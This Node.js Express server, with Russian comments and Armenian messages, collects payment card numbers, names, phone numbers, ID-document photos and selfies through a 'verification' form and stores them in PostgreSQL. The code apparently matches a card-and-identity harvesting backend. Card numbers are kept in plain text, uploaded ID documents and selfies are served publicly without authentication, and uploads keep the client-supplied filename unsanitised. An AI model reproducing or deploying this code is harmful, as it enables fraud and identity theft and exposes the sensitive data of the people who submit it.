const express = require('express');
const multer = require('multer');
const path = require('path');
const { Pool } = require('pg');
require('dotenv').config();

const app = express();

// Подключение к PostgreSQL на Render
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// Multer — для загрузки и сохранения фото
const storage = multer.diskStorage({
  destination: './client/uploads/',
  filename: (req, file, cb) => {
    cb(null, Date.now() + '-' + file.originalname);
  }
});
const upload = multer({ storage });

// Создаём папку uploads, если её нет
const fs = require('fs');
if (!fs.existsSync('./client/uploads')) {
  fs.mkdirSync('./client/uploads', { recursive: true });
}

// Создаём таблицу при старте (если ещё нет)
pool.query(`
  CREATE TABLE IF NOT EXISTS verifications (
    id SERIAL PRIMARY KEY,
    card VARCHAR(19) NOT NULL,
    name TEXT NOT NULL,
    surname TEXT NOT NULL,
    phone VARCHAR(20) NOT NULL,
    doc_path TEXT NOT NULL,
    selfie_path TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT NOW()
  )
`).catch(err => console.error('Ошибка создания таблицы', err));

// Раздаём статические файлы (твой фронтенд)
app.use(express.static(path.join(__dirname, 'client')));
app.use('/uploads', express.static(path.join(__dirname, 'client', 'uploads')));

// Главная маршрут — отдаём index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'client', 'index.html'));
});

// Приём формы + фото
app.post('/submit', upload.fields([
  { name: 'docFile', maxCount: 1 },
  { name: 'selfieFile', maxCount: 1 }
]), async (req, res) => {
  try {
    const { card, name, surname, phone } = req.body;
    const docPath = req.files['docFile'][0].filename;
    const selfiePath = req.files['selfieFile'][0].filename;

    await pool.query(
      `INSERT INTO verifications (card, name, surname, phone, doc_path, selfie_path)
       VALUES ($1, $2, $3, $4, $5, $6)`,
      [card, name, surname, phone, docPath, selfiePath]
    );

    res.json({ success: true, message: 'Հաջողությամբ ուղարկվեց!' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, message: 'Սերվերի սխալ' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Сервер запущен на порту ${PORT}`);
});